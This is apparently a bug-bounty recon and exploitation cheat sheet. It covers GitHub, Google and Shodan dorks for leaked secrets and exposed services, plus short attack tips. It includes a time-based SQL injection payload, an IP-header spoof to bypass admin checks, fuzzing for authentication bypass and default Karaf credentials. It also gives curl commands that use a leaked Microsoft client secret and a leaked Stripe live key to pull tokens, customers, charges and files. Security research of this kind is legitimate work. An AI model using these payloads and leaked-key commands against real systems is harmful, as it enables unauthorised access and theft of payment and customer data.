---
tags:
  - web-app-security
---
- **Github-Dorking**
    
    ```bash
    # Methodology 
    “site.com” :
    here you add your program you wanna search ((you can put “site.com”)) ((“sub.site.com”)) ((“site” only))
    but site name like these ((site-site.com))and have these ((-)) the dork without ((“ “ ))
    # Keywords # password — passwd — pwd — secret — private — Ldap
    Jenkins
    OTP
    oauth
    authoriztion
    password
    pwd
    ftp
    dotfiles
    JDBC
    key-keys
    send_key-keys
    send,key-keys
    token
    user
    login-singin
    passkey-passkeys
    pass
    secret
    SecretAccessKey
    app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
    credentials
    config
    security_credentials
    connectionstring
    ssh2_auth_password
    DB_PASSWORD
    # good Dorks 
    <https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt>
    
    # NOT: **capital**
    like www.bugcrowd.com is repeated ?? -> use “bugcrowd.com” NOT www.bugcrowd ((but in NOT dont add .com))
    example: “paypal” language:python password NOT sandbox.paypal NOT api.paypal NOT www.paypal NOT gmail.com NOT yahoo.com NOT hotmail.com NOT test
    
    # user ? # see if he work for this company 
    orwa atyat bugcrowd linkedin
    user:orwagodfather linkedin 
    user:orwagodfather full name
    user:orwagodfather https://
    user:orwagodfather Ldap
    
    # if you wanna know about some internal links in org you can do like these
    org:bugcrowd https://
    org:bugcrowd host:
    ```
    
- **Google-Dorking**
    
    ```bash
    #!/bin/bash
    
    # Google dorks helper
    #<https://dorks.faisalahmed.me/>
    # Check that a domain has been provided
    if [ -z "$1" ]; then
      echo "Usage: $0 <domain>"
      exit 1
    fi
    
    # Check that ggldorks.txt exists
    if [ ! -f "ggldorks.txt" ]; then
      echo "Error: ggldorks.txt not found"
      exit 1
    fi
    
    # Loop through each line in ggldorks.txt
    while read dork; do
      # Search for the dork on Google
      results=$(curl -s "<https://www.google.com/search?q=site%3A$1+$>{dork// /+}")
    
      # Check if there were any results
      if [[ $results =~ "did not match any documents" ]]; then
        echo "No results for \\"$dork\\""
      else
        # Save the URL and dork to results.txt
        echo "$dork: $1" >> results.txt
      fi
    done < ggldorks.txt
    ```
    
- **Shodan-Dorking**
    
    ```python
    ssl:"<ssl_for_target>"
    ssl.cert.subject.CN:"<specific_hos_name_>"
    # go to <more> option and see the filters like http.title
    ssl.cert.subject.CN:"<specific_hos_name_>" http.title:"<title>"   # exclude -http.title:"Invalid URL"
    ssl.cert.subject.CN:"<specific_hos_name_>" -http.title:"Invalid URL" 401
    ```
    
    - [ ] Big IP shodan Search:—> `http.title:"BIG-IP&reg;-Redirect" org:Org`
    - [ ] CVE 2020-3452 → `http.html_hash:-628873716 “set-cookie: webvpn;”`
    - [ ] CVE CVE-2019-11510 → `http.html:/dana-na/`
    - [ ] CVE-2020–5902→ `inurl:/tmui/login.jsp`
    - [ ] **Databases**
        - [ ] `"MongoDB Server Information" port:27017 -authentication`
        - [ ] `"Set-Cookie: mongo-express=" "200 OK"`
        - [ ] `mysql port:"3306"`
        - [ ] `port:"9200" all:"elastic indices"`
        - [ ] `port:5432 PostgreSQL`****
        - [ ] `Port:5985,6984` → couchDB
        - [ ] `Port:9042,9160` → CassandraDB
        - [ ] `port:8291 os:"MikroTik RouterOS 6.45.9"`
        - [ ] `port:5006,5007 product:mitsubishi`
    - [ ] **Exposed ports**
        - [ ] `proftpd port:21` [**FTP, querying for proftpd, a popular FTP server]**
        - [ ] `"220" "230 Login successful." port:21` [To look for **FTP servers** that allow anonymous logins:]
        - [ ] `openssh port:22` [To query for **OpenSSH**, a popular SSH server:]
        - [ ] `port:"23"` [For **Telnet**, querying for port 23:]
        - [ ] `port:"25" product:"exim"`[To look up **EXIM-powered** mail servers on port 25:]
        - [ ] `port:"11211" product:"Memcached"` [**Memcached**]
        - [ ] `"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"`[**Jenkins**]****
- [ ] `**GET /admin` → blocked | `TRACE /admin` → 200**
    
    ```jsx
    + some info disclosed “Notice that the X-Custom-IP-Authorizationheader, containing your IP address” 
    "Proxy" > "Options", scroll down to the "Match and Replace" section, and click "Add". Leave the match condition blank, but in the "Replace" field, enter:
    X-Custom-IP-Authorization: 127.0.0.1
    ```
    
- [ ] `**cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC”` → [hackerone.com/reports/1890719](http://hackerone.com/reports/1890719)**
    
- [ ] `**/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#**`
    
- [ ] **Have you ever heard about `wc-db` file disclosure?! -> `https://target[.]com/.svn/wc.db`**
    
- [ ] **change `POST` request for sensitive data to `GET` request may be u get `missing authorization policy` bug .**
    
- [ ] [`https://target](<https://target/>)[.]com/wp-content/debug.log`
    

```jsx
f you happen to find Symfony Web Framework that has Symfony profiler debug mode enabled, fuzz the following endpoints:

- /app_dev.php
- /app_dev.php/_profiler/phpinfo
- /app_dev.php/_profiler
- Look for "profiler token" in phpinfo()
```

- [ ] $500 for authentication bypass and reading internal files. Tip: fuzz for special and unicode characters. `/admin/files` --> `302 /authFailure` `/adminFUZZ/files` --> `200` `/admin/FUZZ/files` --> `200`
    
- [ ] Found a Google Map API Key? Follow these steps with me! Google Map API Key starts with "AIzxxxxxxxxxxxxxx" Download this tool for making a clear PoC:
    
    [Abdelrhman Allam on Twitter: "#thread #bugbountytips #googlemapapikey #recon 🧵 Found a Google Map API Key? Follow these steps with me! Google Map API Key starts with "AIzxxxxxxxxxxxxxx" Download this tool for making a clear PoC:](https://twitter.com/sl4x0/status/1651984408843284482?t=BxPfwOqcp-p0fhpXy39KSA&s=19) [https://t.co/22kG7YfJzY](https://t.co/22kG7YfJzY)" / Twitter
    
    [github.comGitHub - ozguralp/gmapsapiscannerContribute to ozguralp/gmapsapiscanner development by creating an account on GitHub.](https://t.co/22kG7YfJzY)
    
- [ ] Apache Karaf Web Console Default Credentials! → `karaf:karaf`
    
- [ ] I found client id & client secret for Microsoft tenant in js file in website → **POC**
    
    ```jsx
    curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'client_id=<CLIENT_ID>&scope=https%3A%2F%[<http://2Fgraph.microsoft.com>](<https://t.co/z2eWOQCENa>)%2F.default&client_secret=<CLIENT_SECRET>&grant_type=client_credentials' '[<https://login.microsoftonline.com>](<https://t.co/fCJczh6J7f>)<TENANT_ID>/oauth2/v2.0/token'
    ```
    
    - [ **Leaking stripe live token ]**
        
        1. He collected all the subdomains using tools like `Subfinder` and `Amass`. After that, he filtered the live subdomains using `httprobe`.
        2. Found a subdomain [](http://admin.redacted.com/)[http://admin.redacted.com](http://admin.redacted.com) which redirects the **user/admin** to google OAuth
            1. Your browser can execute JavaScript, which can, in turn, change the document; in this case, it redirects to **google OAuth.**
        3. After this, he used curl for [](http://admin.redacted.com/)[http://admin.redacted.com](http://admin.redacted.com) to get the plain original output and nothing else.
        
        ⇒ **Leaking stripe live token**
        
        ![https://user-images.githubusercontent.com/108616378/219940019-ba476ee4-4820-42a4-8d50-a08845dd1a40.png](https://user-images.githubusercontent.com/108616378/219940019-ba476ee4-4820-42a4-8d50-a08845dd1a40.png)
        
        ### **⇒ [ Exploiting Stripe Tokens ]**
        
        After checking the `Keyhacks` and the `Stripe API Documentation`. I was able to get a bunch of information, including:
        
        ```
        # Balance: It retrieves the current balance in the Stripe account.
        curl [<https://api.stripe.com/v1/balance>](<https://t.co/NrdwZz2XOp>) -u sk_live_<Secret-Key>:
        # Customers: It retrieves the customer’s data and tracks payments. Including the Customer’s Name, Email, IP used, and many more
        curl <https://api.stripe.com/v1/customers> -u sk_live_<Secret-Key>:
        #Charges: It retrieves charges and card information. One such card details are also attached below. Stripe only gives you the last four digits.
        curl <https://api.stripe.com/v1/charges> -u sk_live_<Secret-Key>:
        #Files: Retrieves Files that the admin uploads. Files generally have invoices, disputes, events, balances, bank accounts, tokens, charges, and more.
        curl <https://api.stripe.com/v1/files> -u sk_live_<Secret-Key>:
        ```
        
        ![https://user-images.githubusercontent.com/108616378/219940030-24b3095a-47cf-4278-b87d-66ef3830bbe7.png](https://user-images.githubusercontent.com/108616378/219940030-24b3095a-47cf-4278-b87d-66ef3830bbe7.png)